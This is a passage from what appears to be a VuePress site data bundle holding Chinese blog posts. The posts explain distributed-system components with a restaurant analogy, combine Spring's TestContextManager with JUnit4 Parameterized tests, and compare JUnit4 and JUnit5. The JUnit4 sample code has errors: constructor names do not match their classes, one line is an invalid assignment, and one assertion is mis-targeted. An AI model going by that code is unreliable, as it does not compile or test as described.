分布式消息：客户在美团团点单并付款后直接返回成功，不用等这阿波罗做完菜交给配送员送到客户手上后再显示成功。\n\n * 分布式任务：客户在美团团下单后的指定时间内不一定付款，采用定时轮扫的方式将这些订单统统取消掉。\n\n * 监控告警：对阿波罗的实时的点点滴滴了解的一清二楚，哪个炒菜员有风险，啥时候点单量最大，在任何时间点，当阿波罗出现任何问题的时候，我得知道。\n\nOK，今天知道了分布式系统中各组件是干嘛的，下次有时间就来聊聊各组件用到的技术实现。',normalizedContent:'随着互联网用户规模扩大，应用系统数量增加，业务逻辑越来越复杂。传统的单机模式已不能满足需求，今天就从单机到分布式聊聊近些年系统架构的转变。\n\n * 一个单机式系统需要的架构：\n\n环境：单台服务器 + 集中式系统\n\n场景：常用在企业内网或用户量少的内管系统\n\n * 一个分布式系统需要的架构：\n\n环境：多台服务器 + 分布式系统集群\n\n场景：常用在用户量大或业务量繁杂的大型系统\n\n\n\n单机系统处理能力瓶颈主要在cpu、内存、硬盘等，当业务量上来之后只能通过垂直拓展的方式来提升性能，而量级达到一定程度后，单机的稳定性和可用性将受到极大的挑战。\n\n此外单机还存在系统程序级别问题，一旦程序中某段代码出现问题，将影响整个系统的稳定性。\n\n由此，行业由集中式系统慢慢演变为分布式系统架构。\n\n分布式系统常见解决方案主要有：配置中心、注册中心、分布式缓存、分布式唯一id、分布式消息、分布式任务、分布式事务、链路追踪、监控告警、服务治理等等。\n\n----------------------------------------\n\n以阿波罗饭店的故事为例，上演分布式架构演变历程~\n\n一个遥远的故事：阿波罗饭店的演变历程\n\n\n\n在远古时期，有一家名为阿波罗的饭店，当客户来的时候，点单、配菜、炒菜都是阿波罗一个人完成。（单机模式）\n\n起初还好，客户量少于个位数的时候阿波罗一个人就忙过来了。\n\n就这样，又过了一年。\n\n阿波罗口碑传开了，客户量直逼上百，好嘛，阿波罗心想：这可不行啊，这我哪忙的过来呀。\n\n过了两天，憋出来一个办法：我一个人不行，我再多找两个跟我一样的，干一样的活。（于是集群模式就出现了）\n\n就这样，又过了一年。\n\n阿波罗口碑太好了，人传人都传疯了，客户量直逼上千，好嘛，阿波罗心想：这可不行啊，这就我们三哪忙的过来呀。\n\n过了两天，又憋出来一个办法：我把我们三个人的活分一下，a去点单，b去配菜，c去炒菜。然后a配10个人，b配10个人，c配10个人，这样哪怕其中一个人有事请假了，相同工作的其他人还能继续顶上。（于是分布式系统+集群模式就出现了）\n\n\n\n刚开始还好，饭店正常运行没啥问题。\n\n突然有一天，饭店乱锅了。。\n\n有一个客户急眼了说：为啥我点单了还没给我上菜呀😡！原来是a1和a8号点单员下单是同一个流水号，导致a8把a1的单覆盖了。（于是分布式序列唯一id出现了）\n\n另一个客户急眼了说：为啥我点个单这么慢呀😡！原来是点单员a2，a3，a4，a5没来，同时对于每天火爆的菜品也没个记录每次都得问炒菜员。（于是注册中心，分布式缓存出现了）\n\n后来啊，饭店时不时出个问题，于是阿波罗找了一波专业团队从头到尾重新把饭店打造了一番。\n\n\n\n于是就引出了：\n\n * 注册中心：所有人上班、请假都得来我这打卡、申请，防止a偷偷没来b偷偷溜走。\n\n * 配置中心：所有人有啥事变动后，其他人都可以及时知道。比如配菜员b1说今天胡萝卜没了，然后b2~b10全都了解。\n\n * 分布式序列：防止点单员a1~a10出现下单重复的情况，并且支持自定义指定规则的订单号。\n\n * 服务治理：当炒菜员c1在炒一个菜还没出锅的时候，点单员a1、a4、a5一直在催催催，炒菜员就告诉他："正在出锅中，正在出锅中"，而不是告诉他：”老子不干了，老子不干了，老子不！干！了！“\n\n * 分布式缓存：点单时，对一些常点菜的介绍、配方等，自己脑子里已经有个影响或者拿个本本记下来，不用每次再问炒菜员了；配菜时，对一些常用的菜，提前也能备好。\n\n * 分布式事务：点单、配菜、炒菜三个步骤要成功都得成功，其中只要有一个步骤出错，那么回退这次单子。\n\n * 链路追踪：点单、配菜、炒菜，我得知道这次流程到哪个环节了，或者在某个环节出问题了，出的什么问题我得知道。\n\n\n\n后来阿波罗又开发了美团团、饿了么么，接入了配送员：\n\n * 分布式消息：客户在美团团点单并付款后直接返回成功，不用等这阿波罗做完菜交给配送员送到客户手上后再显示成功。\n\n * 分布式任务：客户在美团团下单后的指定时间内不一定付款，采用定时轮扫的方式将这些订单统统取消掉。\n\n * 监控告警：对阿波罗的实时的点点滴滴了解的一清二楚，哪个炒菜员有风险，啥时候点单量最大，在任何时间点，当阿波罗出现任何问题的时候，我得知道。\n\nok，今天知道了分布式系统中各组件是干嘛的，下次有时间就来聊聊各组件用到的技术实现。',charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"单元测试：如何在jUnit4中应用两个@RunWith？",frontmatter:{title:"单元测试：如何在jUnit4中应用两个@RunWith？",date:"2021-08-11T00:00:00.000Z",tags:["单元测试","Java"],categories:["后端 Back-end"],isShowComments:!0},regularPath:"/views/backend/%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%951.html",relativePath:"views/backend/单元测试1.md",key:"v-5dad22ec",path:"/views/backend/%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%951.html",headers:[{level:2,title:"解决方案",slug:"解决方案",normalizedTitle:"解决方案",charIndex:282},{level:2,title:"知识扩展",slug:"知识扩展",normalizedTitle:"知识扩展",charIndex:290},{level:3,title:"@RunWith作用",slug:"runwith作用",normalizedTitle:"@runwith作用",charIndex:300},{level:3,title:"使用@RunWith 和@Parameters 进行参数化测试",slug:"使用-runwith-和-parameters-进行参数化测试",normalizedTitle:"使用@runwith 和@parameters 进行参数化测试",charIndex:316},{level:4,title:"什么是参数化",slug:"什么是参数化",normalizedTitle:"什么是参数化",charIndex:3792},{level:4,title:"@Parameters：用于JUnit的参数化功能，用来标记准备数据的方法。",slug:"parameters-用于junit的参数化功能-用来标记准备数据的方法。",normalizedTitle:"@parameters：用于junit的参数化功能，用来标记准备数据的方法。",charIndex:3991}],excerpt:"<Boxx/>\n<p>比如正在使用 spring boot starter test 来编写 JUnit 测试用例。但很想使用 JunitParamrunner，它有助于为参数化测试传递文件。</p>\n<p>基本上它从文件中逐行读取数据，并为每一行调用一个测试用例。</p>\n<p>问题是同时使用需要通过@RunWith 和 SpringJUnit4ClassRunner 以及 JUnitParamsRunner。</p>\n<p>那需要在junit中@RunWith(SpringJUnit4ClassRunner.class)和@RunWith(Parameterized. class)这个要怎么写呢？</p>\n",headersStr:"解决方案 知识扩展 @RunWith作用 使用@RunWith 和@Parameters 进行参数化测试 什么是参数化 @Parameters：用于JUnit的参数化功能，用来标记准备数据的方法。",content:'比如正在使用 spring boot starter test 来编写 JUnit 测试用例。但很想使用 JunitParamrunner，它有助于为参数化测试传递文件。\n\n基本上它从文件中逐行读取数据，并为每一行调用一个测试用例。\n\n问题是同时使用需要通过@RunWith 和 SpringJUnit4ClassRunner 以及 JUnitParamsRunner。\n\n那需要在junit中@RunWith(SpringJUnit4ClassRunner.class)和@RunWith(Parameterized. class)这个要怎么写呢？\n\n\n\n * 解决方案\n * 知识扩展\n   * @RunWith作用\n   * 使用@RunWith 和@Parameters 进行参数化测试\n\n\n\n\n# 解决方案\n\n其实对于@RunWith(SpringJUnit4ClassRunner.class)，无非就是让测试运行于Spring的测试环境。\n\n而我们可以在测试类的构造函数中初始化上下文TestContextManager就相当于集成了spring测试环境，也相当于代替了@RunWith(SpringJUnit4ClassRunner.class)注解。\n\n 1. 书写一个测试基类\n\n/**\n * 测试基类，所有测试类都要继承此类\n */\n@ContextConfiguration(locations="classpath: application-context.xml")\n// @RunWith(SpringJUnit4ClassRunner.class)\n// @SpringBootTest\n// @RunWith(SpringRunner.class)\n// @EnableAutoConfiguration(exclude = {DataSourceAutoConfiguration.class})\n// @ComponentScan(excludeFilters = {@ComponentScan.Filter(type = FilterType.ASSIGNABLE_TYPE, classes = {XxlJobConfig.class})})\npublic class BaseTest {\n\n    // 排除一个bean，Spring将使用这个mock而不是真正的类，所以不会调用@PostConstruct方法去创建\n    @MockBean\n    private XxlJobSpringExecutor xxlJobSpringExecutor;\n\n    private TestContextManager testContextManager;\n\n    public ParametrizedTestWithSpring() throws Exception {\n        this.testContextManager = new TestContextManager(getClass());\n        this.testContextManager.prepareTestInstance(this);\n    }\n\n    @BeforeClass\n    public static void setUp() throws Exception {\n        URL url = BaseTest.class.getClassLoader().getResource("");\n        String path = url.getPath() = "../../../docker/config/";\n        System.setProperty("env.cfg", path);\n        System.setProperty("spring.profiles.active", "dev");\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n\n 2. 编写测试类，添加第二个@RunWith(Parameterized. class)\n\n@RunWith(Parameterized.class )\npublic class Demo1ControllerTest extends BaseTest {\n    \n    private static final Logger logger = LoggerFactory.getLogger(Demo1ControllerTest.class);\n    // 测试参数\n    private String target;\n    // 预期返回结果\n    private String except;\n    @Autowired\n    private Demo1Controlle demo1Controller;\n\n    /**\n     * 测试案例集\n     */\n    @Parameters\n    public static Collection setParam() {\n       return Arrays.asList(new Object[][] { \n           { "emplee_info", "empleeInfo" }, // 测试正常情况\n           { null, null }, // 测试null时处理情况\n           { "", "" }, // 测试空字符串的情况\n           { "employee_info", "EmployeeInfo" }, // 测试当首字母大写时的情况\n           { "employee_info_a", "employeeInfoA" }, // 测试当尾字母为大写时的情况\n           { "employee_a_info", "employeeAInfo" } // 测试多个相连字母大写时的情况\n       });\n    }\n\n    /**\n     * 参数化测试必须的构造函数\n     *\n     * @param except 期望的测试结果 ，对应参数集中的第一个参数\n     * @param target 测试数据，对应结果集中的第二个参数\n     */\n    public TestDemoParamter(String target, String except) {\n       this.except = except;\n       this.target = target;\n    }\n\n    @Test(timeout = 1000)\n    public void testParam(){\n        logger.info("入参：{}", target);\n        String except = demo1Controller.testParam();\n        logger.info("反参：{}", except);\n        Assert.assertEquals(except, target);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n\n\n\n# 知识扩展\n\n\n# @RunWith作用\n\n@RunWith 就是一个运行器：\n\n * @RunWith(JUnit4.class) 就是指用JUnit4来运行\n\n * @RunWith(SpringJUnit4ClassRunner.class), 让测试运行于Spring测试环境\n   \n   此时需要搭配@ContextConfiguration 使用，Spring整合JUnit4测试时，使用注解引入多个配置文件\n\n * @RunWith(Suite.class) 的话就是一套测试集合\n\n@ContextConfiguration语法：\n\n * 单个文件\n   \n   @ContextConfiguration(locations=“classpath：applicationContext.xml”)\n   \n   @ContextConfiguration(classes = SimpleConfiguration.class)\n\n * 多个文件时，可用{}\n   \n   @ContextConfiguration(locations = { “classpath:spring1.xml”, “classpath:spring2.xml” })\n\n\n# 使用@RunWith 和@Parameters 进行参数化测试\n\n# 什么是参数化\n\n * 怎么测试多分支？\n   \n   如一个对考试分数进行评价的函数\n   \n   返回值分别为“优秀，良好，一般，及格，不及格”\n   \n   在编写测试的时候，如果编写 5 个测试方法，进而测试 5 种情况，是 一件很麻烦的事情。\n\n * 为了简化类似的测试，JUnit 提出了“参数化测试”的概念，只写一个测试函 数，把这若干种情况作为参数传递进去，一次性的完成测试。\n\n# @Parameters：用于JUnit的参数化功能，用来标记准备数据的方法。\n\n注意：该方法需要满足一定的要求：\n\n 1. 该方法必须为public static的\n\n 2. 该方法返回值必须为java.util.Collection类型\n\n 3. 该方法的名字不做要求\n\n 4. 该方法没有参数\n\n 5. 参数化测试必须有与之对应的构造函数\n\n具体demo实类如上的Demo1ControllerTest。',normalizedContent:'比如正在使用 spring boot starter test 来编写 junit 测试用例。但很想使用 junitparamrunner，它有助于为参数化测试传递文件。\n\n基本上它从文件中逐行读取数据，并为每一行调用一个测试用例。\n\n问题是同时使用需要通过@runwith 和 springjunit4classrunner 以及 junitparamsrunner。\n\n那需要在junit中@runwith(springjunit4classrunner.class)和@runwith(parameterized. class)这个要怎么写呢？\n\n\n\n * 解决方案\n * 知识扩展\n   * @runwith作用\n   * 使用@runwith 和@parameters 进行参数化测试\n\n\n\n\n# 解决方案\n\n其实对于@runwith(springjunit4classrunner.class)，无非就是让测试运行于spring的测试环境。\n\n而我们可以在测试类的构造函数中初始化上下文testcontextmanager就相当于集成了spring测试环境，也相当于代替了@runwith(springjunit4classrunner.class)注解。\n\n 1. 书写一个测试基类\n\n/**\n * 测试基类，所有测试类都要继承此类\n */\n@contextconfiguration(locations="classpath: application-context.xml")\n// @runwith(springjunit4classrunner.class)\n// @springboottest\n// @runwith(springrunner.class)\n// @enableautoconfiguration(exclude = {datasourceautoconfiguration.class})\n// @componentscan(excludefilters = {@componentscan.filter(type = filtertype.assignable_type, classes = {xxljobconfig.class})})\npublic class basetest {\n\n    // 排除一个bean，spring将使用这个mock而不是真正的类，所以不会调用@postconstruct方法去创建\n    @mockbean\n    private xxljobspringexecutor xxljobspringexecutor;\n\n    private testcontextmanager testcontextmanager;\n\n    public parametrizedtestwithspring() throws exception {\n        this.testcontextmanager = new testcontextmanager(getclass());\n        this.testcontextmanager.preparetestinstance(this);\n    }\n\n    @beforeclass\n    public static void setup() throws exception {\n        url url = basetest.class.getclassloader().getresource("");\n        string path = url.getpath() = "../../../docker/config/";\n        system.setproperty("env.cfg", path);\n        system.setproperty("spring.profiles.active", "dev");\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n\n 2. 编写测试类，添加第二个@runwith(parameterized. class)\n\n@runwith(parameterized.class )\npublic class demo1controllertest extends basetest {\n    \n    private static final logger logger = loggerfactory.getlogger(demo1controllertest.class);\n    // 测试参数\n    private string target;\n    // 预期返回结果\n    private string except;\n    @autowired\n    private demo1controlle demo1controller;\n\n    /**\n     * 测试案例集\n     */\n    @parameters\n    public static collection setparam() {\n       return arrays.aslist(new object[][] { \n           { "emplee_info", "empleeinfo" }, // 测试正常情况\n           { null, null }, // 测试null时处理情况\n           { "", "" }, // 测试空字符串的情况\n           { "employee_info", "employeeinfo" }, // 测试当首字母大写时的情况\n           { "employee_info_a", "employeeinfoa" }, // 测试当尾字母为大写时的情况\n           { "employee_a_info", "employeeainfo" } // 测试多个相连字母大写时的情况\n       });\n    }\n\n    /**\n     * 参数化测试必须的构造函数\n     *\n     * @param except 期望的测试结果 ，对应参数集中的第一个参数\n     * @param target 测试数据，对应结果集中的第二个参数\n     */\n    public testdemoparamter(string target, string except) {\n       this.except = except;\n       this.target = target;\n    }\n\n    @test(timeout = 1000)\n    public void testparam(){\n        logger.info("入参：{}", target);\n        string except = demo1controller.testparam();\n        logger.info("反参：{}", except);\n        assert.assertequals(except, target);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n\n\n\n# 知识扩展\n\n\n# @runwith作用\n\n@runwith 就是一个运行器：\n\n * @runwith(junit4.class) 就是指用junit4来运行\n\n * @runwith(springjunit4classrunner.class), 让测试运行于spring测试环境\n   \n   此时需要搭配@contextconfiguration 使用，spring整合junit4测试时，使用注解引入多个配置文件\n\n * @runwith(suite.class) 的话就是一套测试集合\n\n@contextconfiguration语法：\n\n * 单个文件\n   \n   @contextconfiguration(locations=“classpath：applicationcontext.xml”)\n   \n   @contextconfiguration(classes = simpleconfiguration.class)\n\n * 多个文件时，可用{}\n   \n   @contextconfiguration(locations = { “classpath:spring1.xml”, “classpath:spring2.xml” })\n\n\n# 使用@runwith 和@parameters 进行参数化测试\n\n# 什么是参数化\n\n * 怎么测试多分支？\n   \n   如一个对考试分数进行评价的函数\n   \n   返回值分别为“优秀，良好，一般，及格，不及格”\n   \n   在编写测试的时候，如果编写 5 个测试方法，进而测试 5 种情况，是 一件很麻烦的事情。\n\n * 为了简化类似的测试，junit 提出了“参数化测试”的概念，只写一个测试函 数，把这若干种情况作为参数传递进去，一次性的完成测试。\n\n# @parameters：用于junit的参数化功能，用来标记准备数据的方法。\n\n注意：该方法需要满足一定的要求：\n\n 1. 该方法必须为public static的\n\n 2. 该方法返回值必须为java.util.collection类型\n\n 3. 该方法的名字不做要求\n\n 4. 该方法没有参数\n\n 5. 参数化测试必须有与之对应的构造函数\n\n具体demo实类如上的demo1controllertest。',charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"单元测试：JUnit4和JUnit5的主要区别",frontmatter:{title:"单元测试：JUnit4和JUnit5的主要区别",date:"2022-06-22T00:00:00.000Z",tags:["单元测试","Java"],categories:["后端 Back-end"],isShowComments:!0},regularPath:"/views/backend/%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%952.html",relativePath:"views/backend/单元测试2.md",key:"v-19d79c0c",path:"/views/backend/%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%952.html",headers:[{level:2,title:"1.不同的注解",slug:"_1-不同的注解",normalizedTitle:"1.不同的注解",charIndex:3},{level:2,title:"2.更多的不同",slug:"_2-更多的不同",normalizedTitle:"2.更多的不同",charIndex:14},{level:3,title:"2.1 架构",slug:"_2-1-架构",normalizedTitle:"2.1 架构",charIndex:27},{level:3,title:"2.2 JDK版本要求",slug:"_2-2-jdk版本要求",normalizedTitle:"2.2 jdk版本要求",charIndex:39},{level:3,title:"2.3 断言Assertions",slug:"_2-3-断言assertions",normalizedTitle:"2.3 断言assertions",charIndex:56},{level:3,title:"2.4 假定Assumptions",slug:"_2-4-假定assumptions",normalizedTitle:"2.4 假定assumptions",charIndex:78},{level:3,title:"2.5 标记与过滤",slug:"_2-5-标记与过滤",normalizedTitle:"2.5 标记与过滤",charIndex:101},{level:3,title:"2.6 测试用例簇（Test Suites）",slug:"_2-6-测试用例簇-test-suites",normalizedTitle:"2.6 测试用例簇（test suites）",charIndex:116},{level:3,title:"2.7 JUnit5允许测试非public方法",slug:"_2-7-junit5允许测试非public方法",normalizedTitle:"2.7 junit5允许测试非public方法",charIndex:144},{level:3,title:"2.8 第三方集成",slug:"_2-8-第三方集成",normalizedTitle:"2.8 第三方集成",charIndex:173},{level:2,title:"3.结论",slug:"_3-结论",normalizedTitle:"3.结论",charIndex:186}],excerpt:"<Boxx/>\n",headersStr:"1.不同的注解 2.更多的不同 2.1 架构 2.2 JDK版本要求 2.3 断言Assertions 2.4 假定Assumptions 2.5 标记与过滤 2.6 测试用例簇（Test Suites） 2.7 JUnit5允许测试非public方法 2.8 第三方集成 3.结论",content:' * 1.不同的注解\n * 2.更多的不同\n   * 2.1 架构\n   * 2.2 JDK版本要求\n   * 2.3 断言Assertions\n   * 2.4 假定Assumptions\n   * 2.5 标记与过滤\n   * 2.6 测试用例簇（Test Suites）\n   * 2.7 JUnit5允许测试非public方法\n   * 2.8 第三方集成\n * 3.结论\n\n\n\n\n# 1.不同的注解\n\n大部分注解在 JUnit4 和 JUnit5 中都是一样的，但是有些是不一样的，来快速对比一下：\n\n特性                     JUNIT4         JUNIT5\n声明一个测试方法               @Test          @Test\n在当前类的所有测试方法执行前要执行的方法   @BeforeClass   @BeforeAll\n在当前类的所有测试方法执行后要执行的方法   @AfterClass    @AfterAll\n每个测试方法执行前要执行的方法        @Before        @BeforeEach\n每个测试方法执行后要执行的方法        @After         @AfterEach\n忽略某个测试方法或测试类           @Ignore        @Disabled\n动态测试用例生成工厂             无此特性           @TestFactory\n嵌套测试                   无此特性           @Nested\n标记与过滤                  @Category      @Tag\n注册定制扩展点                无此特性           @ExtendWith\n\n可以看出，JUnit5的注解更贴切地表达了它的含义。\n\n\n# 2.更多的不同\n\n\n# 2.1 架构\n\nJUnit4把所有的代码都打包到一个jar包。 JUnit5由三个子项目构成：JUnit平台(JUnit Platform)，JUnit Jupiter 和 JUnit Vintage。\n\n * JUnit Platform：它定义了测试引擎（TestEngine）API，用于开发运行在JUnit平台上面的新的测试框架。\n * JUnit Jupiter：它拥有所有的新的JUnit注解和测试引擎的实现（Implementation），这个测试引擎的实现能够测试使用新注解开发的测试代码。\n * JUnit Vintage：用于支持在JUnit5平台上运行JUnit3和JUnit4编写的测试用例。\n\n\n# 2.2 JDK版本要求\n\nJUnit4需要Java5或以上版本。 JUnit5需要Java8或以上版本。\n\n\n# 2.3 断言Assertions\n\n在JUnit4中，org.junit.Assert类拥有所有的断言方法，用于判断输出的结果和期望的值是否相等。它们接受额外的错误描述信息作为方法的第一个参数，比如：\n\npublic static void assertEquals(long expected, long actual)\npublic static void assertEquals(String message, long expected, long actual)\n\n\n1\n2\n\n\n在JUnit5中，org.junit.jupiter.Assertions包含了大部分assert()系列方法，并且还包含了assertThrows()、assertAll()系列方法。 JUnit5断言方法也有响应的重载实现，用于支持解析错误描述消息，在测试用例执行失败的时候，会输出错误描述信息，比如：\n\npublic static void assertEquals(long expected, long actual)\npublic static void assertEquals(long expected, long actual, String message)\npublic static void assertEquals(long expected, long actual, Supplier messageSupplier)\n\n\n1\n2\n3\n\n\n\n# 2.4 假定Assumptions\n\n在JUnit4中，org.junit.Assume包含了用于假定条件满足的方法，只有满足了这些条件时，测试用例的执行才有意义。它有如下的五个方法：\n\nassumeFalse()\nassumeNoException()\nassumeNotNull()\nassumeThat()\nassumeTrue()\n\n\n1\n2\n3\n4\n5\n\n\n在JUnit5中，org.junit.jupiter.api.Assumptions包含了用于假定条件满足的方法，只有满足了这些条件时，测试用例的执行才有意义。它有如下的三个方法：\n\nassumeFalse()\nassumingThat()\nassumeTrue()\n\n\n1\n2\n3\n\n\n\n# 2.5 标记与过滤\n\n在JUnit4中，使用@Category注解，在JUnit5中，使用@Tag注解。\n\n\n# 2.6 测试用例簇（Test Suites）\n\n在JUnit4中，通过@RunWith和@Suite注解来指定测试用例簇，比如：\n\nimport org.junit.runner.RunWith;\nimport org.junit.runners.Suite;\n\n@RunWith(Suite.class)\n@Suite.SuiteClasses({\n        ExceptionTest.class,\n        TimeoutTest.class\n})\npublic class JUnit4Example{\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n在JUnit5中，通过@Suite，@SelectPackages和@SelectedClasses注解来指定测试用例簇，比如：\n\nimport org.junit.platform.runner.JUnitPlatform;\nimport org.junit.platform.suite.api.SelectPackages;\nimport org.junit.runner.RunWith;\n\n@Suite\n@SelectPackages("com.howtodoinjava.junit5.examples")\npublic class JUnit5Example{\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# 2.7 JUnit5允许测试非public方法\n\n在JUnit5中，测试类和测试方法不要求一定是public的，我们可以让它们是包作用域的（比如类没有public修饰，方法是protected或者private的，都可以执行）。JUnit5内部使用了反射去寻找测试类和测试方法。反射可以发现非public方法，所以测试类和测试方法就不用非得是public的了。 JUnit5中，测试类也可以没有public构造器，甚至可以有具有参数的构造器，这意味着，拥有无参且public的构造器在JUnit5中不再是强制的了。 比如：\n\nclass AppTest {\n\n    private AppTest(TestInfo testInfo) {\n        System.out.println("Working on test " + testInfo.getDisplayName());\n    }\n\n    @Test\n    void test(){\n        assertTrue(true);\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# 2.8 第三方集成\n\n在JUnit4中，没有支持与第三方插件或者IDE的集成。如果要集成，需要依赖反射。 JUnit5中，专门有一个子项目用于支持与第三方集成，即JUnit Platform。它定义了测试引擎（TestEngine）API，用于开发运行在JUnit5测试平台上运行的测试框架。\n\n\n# 3.结论\n\n在这篇JUnit教程中，我们学习了JUnit4和JUnit5的重要区别，和用它们编写的测试用例的区别。虽然它们底层有很多不同，但是主要的不同还是JUnit5引入了多个模块，并且支持第三方编写自定义的运行时引擎。',normalizedContent:' * 1.不同的注解\n * 2.更多的不同\n   * 2.1 架构\n   * 2.2 jdk版本要求\n   * 2.3 断言assertions\n   * 2.4 假定assumptions\n   * 2.5 标记与过滤\n   * 2.6 测试用例簇（test suites）\n   * 2.7 junit5允许测试非public方法\n   * 2.8 第三方集成\n * 3.结论\n\n\n\n\n# 1.不同的注解\n\n大部分注解在 junit4 和 junit5 中都是一样的，但是有些是不一样的，来快速对比一下：\n\n特性                     junit4         junit5\n声明一个测试方法               @test          @test\n在当前类的所有测试方法执行前要执行的方法   @beforeclass   @beforeall\n在当前类的所有测试方法执行后要执行的方法   @afterclass    @afterall\n每个测试方法执行前要执行的方法        @before        @beforeeach\n每个测试方法执行后要执行的方法        @after         @aftereach\n忽略某个测试方法或测试类           @ignore        @disabled\n动态测试用例生成工厂             无此特性           @testfactory\n嵌套测试                   无此特性           @nested\n标记与过滤                  @category      @tag\n注册定制扩展点                无此特性           @extendwith\n\n可以看出，junit5的注解更贴切地表达了它的含义。\n\n\n# 2.更多的不同\n\n\n# 2.1 架构\n\njunit4把所有的代码都打包到一个jar包。 junit5由三个子项目构成：junit平台(junit platform)，junit jupiter 和 junit vintage。\n\n * junit platform：它定义了测试引擎（testengine）api，用于开发运行在junit平台上面的新的测试框架。\n * junit jupiter：它拥有所有的新的junit注解和测试引擎的实现（implementation），这个测试引擎的实现能够测试使用新注解开发的测试代码。\n * junit vintage：用于支持在junit5平台上运行junit3和junit4编写的测试用例。\n\n\n# 2.2 jdk版本要求\n\njunit4需要java5或以上版本。 junit5需要java8或以上版本。\n\n\n# 2.3 断言assertions\n\n在junit4中，org.junit.assert类拥有所有的断言方法，用于判断输出的结果和期望的值是否相等。它们接受额外的错误描述信息作为方法的第一个参数，比如：\n\npublic static void assertequals(long expected, long actual)\npublic static void assertequals(string message, long expected, long actual)\n\n\n1\n2\n\n\n在junit5中，org.junit.jupiter.assertions包含了大部分assert()系列方法，并且还包含了assertthrows()、assertall()系列方法。 junit5断言方法也有响应的重载实现，用于支持解析错误描述消息，在测试用例执行失败的时候，会输出错误描述信息，比如：\n\npublic static void assertequals(long expected, long actual)\npublic static void assertequals(long expected, long actual, string message)\npublic static void assertequals(long expected, long actual, supplier messagesupplier)\n\n\n1\n2\n3\n\n\n\n# 2.4 假定assumptions\n\n在junit4中，org.junit.assume包含了用于假定条件满足的方法，只有满足了这些条件时，测试用例的执行才有意义。它有如下的五个方法：\n\nassumefalse()\nassumenoexception()\nassumenotnull()\nassumethat()\nassumetrue()\n\n\n1\n2\n3\n4\n5\n\n\n在junit5中，org.junit.jupiter.api.assumptions包含了用于假定条件满足的方法，只有满足了这些条件时，测试用例的执行才有意义。它有如下的三个方法：\n\nassumefalse()\nassumingthat()\nassumetrue()\n\n\n1\n2\n3\n\n\n\n# 2.5 标记与过滤\n\n在junit4中，使用@category注解，在junit5中，使用@tag注解。\n\n\n# 2.6 测试用例簇（test suites）\n\n在junit4中，通过@runwith和@suite注解来指定测试用例簇，比如：\n\nimport org.junit.runner.runwith;\nimport org.junit.runners.suite;\n\n@runwith(suite.class)\n@suite.suiteclasses({\n        exceptiontest.class,\n        timeouttest.class\n})\npublic class junit4example{\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n在junit5中，通过@suite，@selectpackages和@selectedclasses注解来指定测试用例簇，比如：\n\nimport org.junit.platform.runner.junitplatform;\nimport org.junit.platform.suite.api.selectpackages;\nimport org.junit.runner.runwith;\n\n@suite\n@selectpackages("com.howtodoinjava.junit5.examples")\npublic class junit5example{\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# 2.7 junit5允许测试非public方法\n\n在junit5中，测试类和测试方法不要求一定是public的，我们可以让它们是包作用域的（比如类没有public修饰，方法是protected或者private的，都可以执行）。junit5内部使用了反射去寻找测试类和测试方法。反射可以发现非public方法，所以测试类和测试方法就不用非得是public的了。 junit5中，测试类也可以没有public构造器，甚至可以有具有参数的构造器，这意味着，拥有无参且public的构造器在junit5中不再是强制的了。 比如：\n\nclass apptest {\n\n    private apptest(testinfo testinfo) {\n        system.out.println("working on test " + testinfo.getdisplayname());\n    }\n\n    @test\n    void test(){\n        asserttrue(true);\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# 2.8 第三方集成\n\n在junit4中，没有支持与第三方插件或者ide的集成。如果要集成，需要依赖反射。 junit5中，专门有一个子项目用于支持与第三方集成，即junit platform。它定义了测试引擎（testengine）api，用于开发运行在junit5测试平台上运行的测试框架。\n\n\n# 3.结论\n\n在这篇junit教程中，我们学习了junit4和junit5的重要区别，和用它们编写的测试用例的区别。虽然它们底层有很多不同，但是主要的不同还是junit5引入了多个模块，并且支持第三方编写自定义的运行时引擎。',charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"Zookeeper 全解",frontmatter:{title:"Zookeeper 全解",date:"2020-12-26T00:00:00.000Z",tags:["分布式","ZooKeeper"],categories:["后端 